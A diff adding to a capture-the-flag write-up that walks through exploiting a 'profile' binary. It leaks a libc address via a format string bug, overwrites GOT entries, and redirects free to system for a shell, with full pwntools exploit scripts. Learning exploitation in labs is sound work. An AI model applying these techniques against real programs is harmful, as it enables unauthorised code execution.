@@ -288,4 +288,199 @@ Well, we can now see that `HELLO`, along with two memory addresses (one is `nil`
 
 ### Leaking the libc address using the fsb vulnerability
 
-Now, we have a Format String Bug, which can give us address leaks. What we have to do now, is find the base-address of the binary.
+Now, we have a Format String Bug, which can give us address leaks. What we have to do now, is find the base-address of the binary or libc. So, for that, let's try and send 20 `%p`'s and see what we get.
+
+```python
+io.sendlineafter(b"Name: ", b"HELLO|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|")
+```
+
+Now, in order to see what these addresses are, we will attach gdb to our process, this will become:
+
+```python
+gdb.attach(io, "init-pwndbg")
+```
+
+![Alt text](/static/writeups/blackhatmea23-quals/image-7.png)
+
+Now, we got quite a lot of addresses leaked. Now, let's see in gdb, firstly the memory mapping i.e. where each address is mapped to within the binary, we can use `vmmap` command in pwndbg
+
+![Alt text](/static/writeups/blackhatmea23-quals/image-8.png)
+
+Now, since we're looking for a libc leak, we need to find addresses that start with `0x7face` prefix
+
+> NOTE: This address will change at each run because of ASLR, therefore we simply need to subtract the leaked address with the current base of LIBC. On each launch, the leaked value will be `offset` away from the base of libc.
+
+![Alt text](/static/writeups/blackhatmea23-quals/image-9.png)
+
+Now, we can see that `0x7face7104a37` belongs to libc and is found at offset `3`. Let's see in GDB, where this address is mapped to
+
+![Alt text](/static/writeups/blackhatmea23-quals/image-10.png)
+
+Now, the base of libc is:
+
+![Alt text](/static/writeups/blackhatmea23-quals/image-11.png)
+
+i.e.
+
+```py
+p/x 0x7face7104a37-0x7face6ff0000
+```
+
+![Alt text](/static/writeups/blackhatmea23-quals/image-12.png)
+
+Now, at each run, the base of libc will `0x114a37` away from the leaked address. So, we can simply subtract the leaked address with `0x114a37` to get the base of libc. Our updated exploit becomes:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+import re
+
+def overflow(addr: int):
+	return str((addr << 32) + 1).encode()
+
+context.terminal = ['tmux', 'splitw', '-h']
+elf = context.binary = ELF("./profile")
+libc = elf.libc
+io = process()
+
+log.info("Overwriting free(%#x) with main(%#x)" % (elf.got.free, elf.sym.main))
+io.sendlineafter(b"Age: ", overflow(elf.got.free))
+io.sendlineafter(b'Name: ', p32(elf.sym.main)[:3])
+
+log.info("Overwriting exit(%#x) with main(%#x)" % (elf.got.exit, elf.sym.main))
+io.sendlineafter(b"Age: ", overflow(elf.got.exit))
+io.sendlineafter(b'Name: ', p32(elf.sym.main)[:3])
+
+log.info("Overwriting free(%#x) with printf(%#x)" % (elf.got.free, elf.sym.printf))
+io.sendlineafter(b"Age: ", overflow(elf.got.free))
+io.sendlineafter(b'Name: ', p32(elf.sym.printf)[:3])
+
+io.sendlineafter(b"Age: ", b"1")
+io.sendlineafter(b"Name: ", b"HELLO|%3$p|")
+
+data = io.recvuntil(b'|Age')
+''' Getting only the address '''
+leak = ''.join(re.findall("HELLO|(.*?)|Age", data.decode())).split('|')[-2]
+leak = int(leak, 16)
+
+libc.address = leak - 0x114a37
+log.info("Libc base: %#x" % libc.address)
+
+```
+
+### Overwriting the free function in GOT with system to get a shell
+
+Now, we have the libc base, we can simply overwrite the `free` function with `system` to get a shell. The updated exploit becomes:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+import re
+
+def overflow(addr: int):
+	return str((addr << 32) + 1).encode()
+
+context.terminal = ['tmux', 'splitw', '-h']
+elf = context.binary = ELF("./profile")
+libc = elf.libc
+io = process()
+
+log.info("Overwriting free(%#x) with main(%#x)" % (elf.got.free, elf.sym.main))
+io.sendlineafter(b"Age: ", overflow(elf.got.free))
+io.sendlineafter(b'Name: ', p32(elf.sym.main)[:3])
+
+log.info("Overwriting exit(%#x) with main(%#x)" % (elf.got.exit, elf.sym.main))
+io.sendlineafter(b"Age: ", overflow(elf.got.exit))
+io.sendlineafter(b'Name: ', p32(elf.sym.main)[:3])
+
+log.info("Overwriting free(%#x) with printf(%#x)" % (elf.got.free, elf.sym.printf))
+io.sendlineafter(b"Age: ", overflow(elf.got.free))
+io.sendlineafter(b'Name: ', p32(elf.sym.printf)[:3])
+
+io.sendlineafter(b"Age: ", b"1")
+io.sendlineafter(b"Name: ", b"HELLO|%3$p|")
+
+data = io.recvuntil(b'|Age')
+''' Getting only the address '''
+leak = ''.join(re.findall("HELLO|(.*?)|Age", data.decode())).split('|')[-2]
+leak = int(leak, 16)
+
+libc.address = leak - 0x114a37
+log.info("Libc base: %#x" % libc.address)
+
+log.info("Overwriting free(%#x) with printf(%#x)" % (elf.got.free, elf.sym.printf))
+io.sendlineafter(b": ", overflow(elf.got.free))
+io.sendlineafter(b': ', p64(libc.sym["system"]))
+
+io.clean()
+
+io.interactive()
+```
+
+Now, running this, we will firstly type the age i.e. `69` (nice). And then, we will type the name as `/bin/sh` and then we will get a shell.
+
+![Alt text](/static/writeups/blackhatmea23-quals/image-13.png)
+
+let's add this in our script as well:
+
+```python
+io.sendline("69")
+io.sendline("/bin/sh")
+```
+
+Now, since we don't have access to the remote, let's setup the provided docker and run this exploit against the docker so that we can confirm that the exploit works remotely.
+
+![Alt text](/static/writeups/blackhatmea23-quals/image-14.png)
+
+Therefore, the final exploit is:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+import re
+
+def overflow(addr: int):
+	return str((addr << 32) + 1).encode()
+
+context.terminal = ['tmux', 'splitw', '-h']
+elf = context.binary = ELF("./profile_patched")
+libc = elf.libc
+io = process()
+# io = remote("localhost", 5000)
+
+log.info("Overwriting free(%#x) with main(%#x)" % (elf.got.free, elf.sym.main))
+io.sendlineafter(b"Age: ", overflow(elf.got.free))
+io.sendlineafter(b'Name: ', p32(elf.sym.main)[:3])
+
+log.info("Overwriting exit(%#x) with main(%#x)" % (elf.got.exit, elf.sym.main))
+io.sendlineafter(b"Age: ", overflow(elf.got.exit))
+io.sendlineafter(b'Name: ', p32(elf.sym.main)[:3])
+
+log.info("Overwriting free(%#x) with printf(%#x)" % (elf.got.free, elf.sym.printf))
+io.sendlineafter(b"Age: ", overflow(elf.got.free))
+io.sendlineafter(b'Name: ', p32(elf.sym.printf)[:3])
+
+io.sendlineafter(b"Age: ", b"1")
+io.sendlineafter(b"Name: ", b"HELLO|%3$p|")
+
+data = io.recvuntil(b'|Age')
+''' Getting only the address '''
+leak = ''.join(re.findall("HELLO|(.*?)|Age", data.decode())).split('|')[-2]
+leak = int(leak, 16)
+
+libc.address = leak - 0x114a37
+log.info("Libc base: %#x" % libc.address)
+
+log.info("Overwriting free(%#x) with printf(%#x)" % (elf.got.free, elf.sym.printf))
+io.sendlineafter(b": ", overflow(elf.got.free))
+io.sendlineafter(b': ', p64(libc.sym["system"]))
+io.sendline(b"69")
+io.sendline(b"/bin/sh")
+io.clean()
+io.interactive()
+```
+
+Overall, very good challenge. I learned quite a new few neat tricks.
